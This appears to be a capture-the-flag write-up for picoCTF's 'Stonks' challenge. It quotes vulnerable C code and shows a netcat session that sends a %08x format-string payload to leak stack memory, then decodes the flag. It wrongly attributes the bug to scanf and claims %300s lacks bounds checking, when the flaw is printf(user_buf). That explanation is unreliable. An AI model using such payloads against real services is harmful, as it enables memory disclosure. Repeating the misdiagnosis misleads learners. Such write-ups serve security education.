# Stonks

## Description
```
I decided to try something noone else has before. 
I made a bot to automatically trade stonks for me using AI and machine learning. 
I wouldn't believe you if you told me it's unsecure! `nc mercury.picoctf.net 20195`
```

## Provided Files
```
- vuln.c
```

## Writeup

Starting off we should take a look at the provided file. <br/>
Most of the time when analyzing such files we want to look for functions which process our input in an insecure way. <br/>
```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

In here we have a vulnerability in the `scanf("%300s", user_buf);` function call. <br/>
The `%300s` format specifier in the `scanf` function indicates that it expects to read a string of characters from the input, with a maximum field width of `300 characters`. The input characters will then be read into the `user_buf` buffer. <br/>

> [!NOTE]
> It's important to note that `%300s` does not perform bounds checking on the input, which may lead to memory leaks. <br/>

Knowing this we can use `format specifiers` like `%08x` to leak 4 bytes from the current memory stack at a time in `hex-encoded` format.
```sh
$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
Buying stonks with token:
092753f00804b000080489c3f7fabd80ffffffff0000000109273160f7fb9110f7fabdc7000000000927418000000003092753d0092753f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ff99007df7fe6af8f7fb9440d0f3e4000000000100000000f7e48ce9f7fba0c0f7fab5c0f7fab000ff99e7f8f7e3968df7fab5c008048ecaff99e80400000000f7fcdf090804b000
Portfolio as of Tue Feb 20 17:57:31 UTC 2024


3 shares of ISP
1 shares of YQY
21 shares of S
138 shares of R
5 shares of PL
118 shares of I
419 shares of F
506 shares of QY
Goodbye!
``` 

Looking at the output it seems like it worked. <br/>
Using the `from hex` module in [CyberChef](https://cyberchef.org/#recipe=From_Hex('Auto')&input=MDkyNzUzZjAwODA0YjAwMDA4MDQ4OWMzZjdmYWJkODBmZmZmZmZmZjAwMDAwMDAxMDkyNzMxNjBmN2ZiOTExMGY3ZmFiZGM3MDAwMDAwMDAwOTI3NDE4MDAwMDAwMDAzMDkyNzUzZDAwOTI3NTNmMDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzNDMwMzY2NDMwMzY2NGZmOTkwMDdkZjdmZTZhZjhmN2ZiOTQ0MGQwZjNlNDAwMDAwMDAwMDEwMDAwMDAwMGY3ZTQ4Y2U5ZjdmYmEwYzBmN2ZhYjVjMGY3ZmFiMDAwZmY5OWU3ZjhmN2UzOTY4ZGY3ZmFiNWMwMDgwNDhlY2FmZjk5ZTgwNDAwMDAwMDAwZjdmY2RmMDkwODA0YjAwMA) we can than read the actual result. <br/>
```

--------------------------------------
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06d}
--------------------------------------

```

The flag seems to be surrounded by useles binary and the `endianness` seem to be swapped. <br/>
Knowing this we can use the `swap endianness` module from [CyberChef](https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=MDkyNzUzZjAwODA0YjAwMDA4MDQ4OWMzZjdmYWJkODBmZmZmZmZmZjAwMDAwMDAxMDkyNzMxNjBmN2ZiOTExMGY3ZmFiZGM3MDAwMDAwMDAwOTI3NDE4MDAwMDAwMDAzMDkyNzUzZDAwOTI3NTNmMDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzNDMwMzY2NDMwMzY2NGZmOTkwMDdkZjdmZTZhZjhmN2ZiOTQ0MGQwZjNlNDAwMDAwMDAwMDEwMDAwMDAwMGY3ZTQ4Y2U5ZjdmYmEwYzBmN2ZhYjVjMGY3ZmFiMDAwZmY5OWU3ZjhmN2UzOTY4ZGY3ZmFiNWMwMDgwNDhlY2FmZjk5ZTgwNDAwMDAwMDAwZjdmY2RmMDkwODA0YjAwMA) to extract the real flag. <br/>
Obtaining the actual flag `picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}` concludes this writeup. 

